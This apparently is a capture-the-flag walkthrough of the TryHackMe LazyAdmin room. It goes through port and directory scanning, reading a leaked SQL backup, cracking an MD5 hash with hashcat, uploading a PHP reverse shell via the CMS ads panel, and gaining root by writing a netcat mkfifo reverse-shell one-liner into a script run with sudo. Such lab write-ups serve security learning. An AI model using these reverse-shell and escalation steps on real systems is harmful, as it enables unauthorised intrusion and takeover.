## LazyAdmin | TryHackMe

This is the link for the room [LazyAdmin](https://tryhackme.com/room/lazyadmin)

<img src="https://user-images.githubusercontent.com/67650329/195094075-bb247566-cf4f-4962-b2ed-11b176a35fea.jpeg" width="250px" align="center">

---
Easy linux machine to practice your skills.

Have some fun! There might be multiple ways to get user access.

Access the website first.

<img src="https://user-images.githubusercontent.com/67650329/195094386-e944bb2f-8a6e-4cfd-9419-56c07814a116.png" width="500px" align="center">

`nmap -sC -sV -p- -T4 [TARGET_IP]`

- sC = Run the default script.
- sV = Version of services.
- -p- = Checking for all port.
- T4 = Scanning speed.

<img src="https://user-images.githubusercontent.com/67650329/195094779-0e988887-6eca-4041-adb9-d30f9e5c143d.png" width="500px" align="center">

`gobuster dir -u [TARGET_IP] -w [WORDLIST] -f -n`

- u = Url/Link Target.
- w = Wordlist to use.
- f = Nospam.
- n = No Status just result (Nospam).

<img src="https://user-images.githubusercontent.com/67650329/195095231-fedd65e9-cfa5-4048-90df-c07f862ce7e4.png" width="500px" align="center">

Try again use gobuster with subdomain /content/.

<img src="https://user-images.githubusercontent.com/67650329/195095464-a0cf505a-71a8-479c-868e-c39f10d97ef9.png" width="500px" align="center">

<img src="https://user-images.githubusercontent.com/67650329/195095305-3d28a6f7-9d8d-4548-8017-61d59218bd1b.png" width="500px" align="center">

<img src="https://user-images.githubusercontent.com/67650329/195095890-5232fe86-8313-4405-8f3a-973899fe3bf0.png" width="500px" align="center">

Search on the [exploit.db](https://www.exploit-db.com/exploits/40718)

<img src="https://user-images.githubusercontent.com/67650329/195096137-e2f89466-55de-4a0f-b64f-99d1f63c0434.png" width="500px" align="center">

`http://localhost/content/inc/mysql_backup`

<img src="https://user-images.githubusercontent.com/67650329/195096326-21106528-92c1-47e1-8ebb-24f66c3b8868.png" width="500px" align="center">

Download the SQL and Open it.

<img src="https://user-images.githubusercontent.com/67650329/195096434-58e65a2e-ceaa-4d72-931d-eae3a51dce7c.png" width="500px" align="center">

This hash with MD5 encrypt.

Hash the password use **Hashcat**

`hashcat -m 0 [textfile] [wordlist]`

<img src="https://user-images.githubusercontent.com/67650329/195096746-bd600cc0-c60c-46ed-a749-7e993e14e15a.png" width="500px" align="center">

And you got the password.

Login into website use the password `/content/as`.

Go to the Dashboard -> Ads.

Use the [reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).

Copy it and Change the IP and PORT.

And before you run the listener like `netcat`.

`http://[IP]/content/inc/ads/[Name_Shell].php`

<img src="https://user-images.githubusercontent.com/67650329/195097785-ae0d58a8-c1e0-4a2d-bdc7-b26b5b5b0df2.png" width="500px" align="center">

User.txt on /home/itguy

<img src="https://user-images.githubusercontent.com/67650329/195098079-a5a87e85-2b78-4887-a928-670a7baf1742.png" width="300px" align="center">

<img src="https://user-images.githubusercontent.com/67650329/195098128-5b2a8ff8-f682-4ff0-8f7f-c6ae2f002b40.png" width="300px" align="center">

<img src="https://user-images.githubusercontent.com/67650329/195098422-4fb3b24f-ec93-4b5c-9d43-bc79a2250f23.png" width="500px" align="center">

`echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [IP] [PORT] >/tmp/f" > /etc/copy.sh`

`sudo /usr/bin/perl /home/itguy/backup.pl`

<img src="https://user-images.githubusercontent.com/67650329/195098607-53bc35d4-43b0-49b9-8b7d-f8380e97eafa.png" width="300px" align="center">

---
